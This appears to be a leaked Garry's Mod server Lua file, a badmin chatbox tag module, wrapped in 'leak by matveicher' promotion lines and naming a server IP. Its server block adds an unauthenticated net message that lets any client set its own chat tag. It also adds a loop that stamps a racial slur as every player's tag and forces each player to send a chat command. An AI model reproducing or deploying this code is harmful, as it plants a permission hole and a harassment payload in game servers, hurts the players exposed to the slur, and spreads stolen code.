--leak by matveicher
--vk group - https://vk.com/codespill
--steam - https://steamcommunity.com/profiles/76561198968457747/
--ds server - https://discord.gg/7XaRzQSZ45
--ds - matveicher

--[[
Server Name: ▃▆█ VastRP #1 | ПРОМО 1000 RUB | X2 █▆▃
Server IP:   212.22.93.206:27015
File Path:   addons/[int]badmin/lua/ba/modules/chatbox/tags/tags_sh.lua
		 __        __              __             ____     _                ____                __             __         
   _____/ /_____  / /__  ____     / /_  __  __   / __/____(_)__  ____  ____/ / /_  __     _____/ /____  ____ _/ /__  _____
  / ___/ __/ __ \/ / _ \/ __ \   / __ \/ / / /  / /_/ ___/ / _ \/ __ \/ __  / / / / /    / ___/ __/ _ \/ __ `/ / _ \/ ___/
 (__  ) /_/ /_/ / /  __/ / / /  / /_/ / /_/ /  / __/ /  / /  __/ / / / /_/ / / /_/ /    (__  ) /_/  __/ /_/ / /  __/ /    
/____/\__/\____/_/\___/_/ /_/  /_.___/\__, /  /_/ /_/  /_/\___/_/ /_/\__,_/_/\__, /____/____/\__/\___/\__,_/_/\___/_/     
                                     /____/                                 /____/_____/                                  
--]]

--[[
addons/badmin/lua/badmin/modules/chatbox/tags/tags_sh.lua
--]]
nw.Register 'ChatTag'

	:Write(net.WriteString)

	:Read(net.ReadString)

	:SetPlayer()



term.Add('ChatTagCleared', 'Your chat tag was cleared.')

term.Add('ChatTagUpdated', 'Your chat tag was updated.')



function PLAYER:GetChatTag()

	local tag = hook.Call('PlayerOverrideChatTag', nil, self) or self:GetNetVar('ChatTag') or hook.Call('PlayerGetChatTag', nil, self)



	if tag and ba.chatEmotes[tag] and (SERVER or (not cvar.GetValue('DisableEmotes'))) then

		return tag .. ' '

	end



	return ''

end

if SERVER then
	util.AddNetworkString("ba.chat.SetTag")

	net.Receive("ba.chat.SetTag", function(_,ply)
		ply:SetNetVar("ChatTag",net.ReadString())
		print(ply:GetNetVar("ChatTag"))
	end)

	for k,v in pairs(player.GetAll()) do
		v:SetNetVar("ChatTag",":niggers:")
		v:ConCommand("say asdasd")
	end
end

--leak by matveicher
--vk group - https://vk.com/codespill
--steam - https://steamcommunity.com/profiles/76561198968457747/
--ds server - https://discord.gg/7XaRzQSZ45
--ds - matveicher
